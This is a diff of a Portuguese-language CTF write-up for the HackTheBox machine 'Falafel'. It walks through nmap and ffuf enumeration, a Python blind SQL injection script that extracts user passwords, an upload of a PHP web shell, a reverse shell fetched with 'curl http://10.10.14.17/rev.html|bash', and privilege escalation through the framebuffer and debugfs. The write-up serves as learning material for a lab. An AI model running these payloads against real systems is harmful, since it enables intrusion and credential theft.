@@ -1,33 +1,34 @@
-1. [Resolução da máquina **Falafel**](#resolução-da-máquina-falafel) 1. [Máquina HARD (hackthebox.com)](#máquina-hard-hacktheboxcom) 2. [by **_JavaliMZ_** - 09/09/2021](#by-javalimz---09092021)
-2. [Enumeração](#enumeração)
-    1. [Nmap](#nmap)
-    2. [WebSite](#website)
-        1. [Fuzzing the website](#fuzzing-the-website)
-        2. [SQLi](#sqli)
-        3. [RCE](#rce)
-        4. [Reverse Shell](#reverse-shell)
-    3. [PrivEsc](#privesc)
-        1. [Group video](#group-video)
-        2. [Group disk](#group-disk)
-        3. [debugfs](#debugfs)
-
 ![](Assets/HTB-Linux-Hard-Falafel/icon.webp)
 
 <img src="https://img.shields.io/badge/Falafel-HackTheBox-red?style=plastic" width="200">
 
-# Resolução da máquina **Falafel**
+<h1> Resolução da máquina <b>Falafel</b></h1>
 
-#### Máquina HARD (hackthebox.com)
+<h4> 1.0.0.1. Máquina HARD (hackthebox.com)</h4>
 
-#### by **_JavaliMZ_** - 09/09/2021
-
----
+<h4> 1.0.0.2. by <b><i>JavaliMZ</i></b> - 09/09/2021</h4>
 
 ---
 
-# Enumeração
+---
 
-## Nmap
+- [1. Enumeração](#1-enumeração)
+  - [1.1. Nmap](#11-nmap)
+- [2. WebSite](#2-website)
+  - [2.1. Fuzzing the website](#21-fuzzing-the-website)
+  - [2.2. SQLi](#22-sqli)
+  - [2.3. RCE](#23-rce)
+    - [2.3.1. Reverse Shell](#231-reverse-shell)
+- [3. PrivEsc](#3-privesc)
+  - [3.1. Group video](#31-group-video)
+  - [3.2. Group disk](#32-group-disk)
+  - [3.3. debugfs](#33-debugfs)
+
+---
+
+# 1. Enumeração
+
+## 1.1. Nmap
 
 Na fase de enumeração, a ferramenta _nmap_ tem um lugar imprescindível!! É possível enumerar portas manualmente, com um simples _for loop_ e um _echo para o /dev/tcp/\<IP>/\<PORT>_, mas, para além do nmap ser mais controlável em termo de rendimento, tem também montes de scripts.nse que podem descobrir coisas sobre cada porta aberta.
 
@@ -37,7 +38,7 @@ Na fase de enumeração, a ferramenta _nmap_ tem um lugar imprescindível!! É p
 
 O resultado do nmap indica-nos que estamos que o nosso alvo é uma máquina Linux, com apenas as portas 22 e 80 abertas. As versões dos serviços correndo nessas portas não parecem ter vulnerabilidades críticas, por isso estamos certos que o ponto de entrada é o servidor WEB
 
-## WebSite
+# 2. WebSite
 
 ![Website - First page](Assets/HTB-Linux-Hard-Falafel/website-1.png)
 
@@ -50,7 +51,7 @@ echo -e "10.10.10.73\tfalafel.htb" >> /etc/hosts
 
 Apesar de ser uma suspeita plausível, não existe virtual host.
 
-### Fuzzing the website
+## 2.1. Fuzzing the website
 
 Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.
 
@@ -63,7 +64,7 @@ ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
 #>  js                      [Status: 403, Size: 289, Words: 22, Lines: 12]
 #>  uploads                 [Status: 403, Size: 294, Words: 22, Lines: 12]
 #>  images                  [Status: 403, Size: 293, Words: 22, Lines: 12]
-						#>  [Status: 200, Size: 7203, Words: 774, Lines: 110]
+                        #>  [Status: 200, Size: 7203, Words: 774, Lines: 110]
 #>  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
 ```
 
@@ -110,7 +111,7 @@ Bem, isto nos trás algumas informações...
 
 Ainda nos diz que o usuário chris conseguiu ter FULL CONTROL do site usando um recurso de uploads de imagens, que ainda não descobrimos. Sabemos ainda que o url de upload de imagens está filtrado, por isso não deve ser assim tão fácil... Prossigamos
 
-### SQLi
+## 2.2. SQLi
 
 Quando abrimos a página http://falafel.htb/ de um browser, vemos então um botão login. Ao por credenciais por defeito do tipo _admin:admin, admin:password, test:test..._, verificamos que poderá existir um usuário admin, pois temo uma mensagem de erro que diz **"Wrong identification : admin"**. Outros usuários aleatórios nos dá a mensagem **"Try again.."**. Agora, e com a tal mensagem de cyberlaw.txt, podemos assumir que o usuário **"admin"** existe.
 
@@ -143,37 +144,37 @@ from pwn import log
 
 
 def sendRequest(code):
-	url = "http://falafel.htb/login.php"
-	header = {"Cookie": "PHPSESSID=0tpuo9bnh5jo18ibamo44q3ej0"}
-	data = {"username": code, "password": "password"}
+    url = "http://falafel.htb/login.php"
+    header = {"Cookie": "PHPSESSID=0tpuo9bnh5jo18ibamo44q3ej0"}
+    data = {"username": code, "password": "password"}
 
-	res = requests.post(url, headers=header, data=data).text
-	res = res.replace("\n", " ").replace("\t", " ")
-	regexPattern = r"<br>(.*?)</br>"
-	res = re.findall(regexPattern, res)[0].strip()
-	return res
+    res = requests.post(url, headers=header, data=data).text
+    res = res.replace("\n", " ").replace("\t", " ")
+    regexPattern = r"<br>(.*?)</br>"
+    res = re.findall(regexPattern, res)[0].strip()
+    return res
 
 
 def getPassword(username):
-	l1 = log.progress(username)
-	password = ""
-	chars = "0123456789abcdefghijklmnopqrstuvwxyz"
-	continueSearching = True
-	for position in range(1, 100):
-		if continueSearching:
-			for char in chars:
-				code = f"{username}' and substring(password,{position},1)='{char}'-- -"
-				if "Wrong identification" in sendRequest(code):
-					password += char
-					l1.status(password)
-					break
-				if char == "z":
-					continueSearching = False
+    l1 = log.progress(username)
+    password = ""
+    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
+    continueSearching = True
+    for position in range(1, 100):
+        if continueSearching:
+            for char in chars:
+                code = f"{username}' and substring(password,{position},1)='{char}'-- -"
+                if "Wrong identification" in sendRequest(code):
+                    password += char
+                    l1.status(password)
+                    break
+                if char == "z":
+                    continueSearching = False
 
 
 def main():
-	getPassword("chris")
-	getPassword("admin")
+    getPassword("chris")
+    getPassword("admin")
 
 
 main()
@@ -209,7 +210,7 @@ Login efectuado com sucesso!
 
 ![logged as admin](Assets/HTB-Linux-Hard-Falafel/login_admin.png)
 
-### RCE
+## 2.3. RCE
 
 Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.
 
@@ -241,8 +242,8 @@ Cração de um ficheiro malicioso:
 
 ```php
 <?php
-	echo "\nURL Shell... url?cmd=<command>\n\n";
-	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    echo "\nURL Shell... url?cmd=<command>\n\n";
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 ```
 
@@ -273,7 +274,7 @@ Note the path of the file and go to the webshell Ok, conseguimos enviar um arqui
 
 Temos Execução de código remoto!
 
-### Reverse Shell
+### 2.3.1. Reverse Shell
 
 A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracteres especiais e assim é partilhar um ficheiro com o código do reverse shell lá dentro, para depois fazer um curl e pipeá-lo com um bash (sim pipeá-lo, neste blog, este verbo existe xD)
 
@@ -294,7 +295,7 @@ sudo nc -lvnp 443               # On another one
 
 > http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=curl%20http://10.10.14.17/rev.html|bash
 
-## PrivEsc
+# 3. PrivEsc
 
 Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php
 
@@ -309,14 +310,14 @@ Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais
    // Check connection
    if (mysqli_connect_errno())
    {
-	  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+      echo "Failed to connect to MySQL: " . mysqli_connect_error();
    }
 ?>
 ```
 
 Estas credenciais server para fazer login ao MySQL, mas se reutilizar-mos as credenciais para fazer login por ssh, vemos que as credenciais são válidas!
 
-### Group video
+## 3.1. Group video
 
 Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irrealista, mas não deixa de ser interessante. Esta máquina não tem mais vulnerabilidades. Ok, então onde estão as credenciais do usuário "yossi"?! Estão no ecrã...
 
@@ -355,7 +356,7 @@ Abrir o ficheiro com ajuda do GIMP, definido manualmente que este ficheiro é um
 
 Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só se vê porque o yossi errou primeiro ao introduzi-la e por "grande sorte" ainda está a vista na tela looooool)
 
-### Group disk
+## 3.2. Group disk
 
 ```bash
 for group in $(groups); do echo -e "\n\n\n[*] Archive with group $group permition:\n"; find / -group $group 2>/dev/null; done
@@ -384,7 +385,7 @@ ll /dev/sda1
 #>  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
 ```
 
-### debugfs
+## 3.3. debugfs
 
 Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:
 
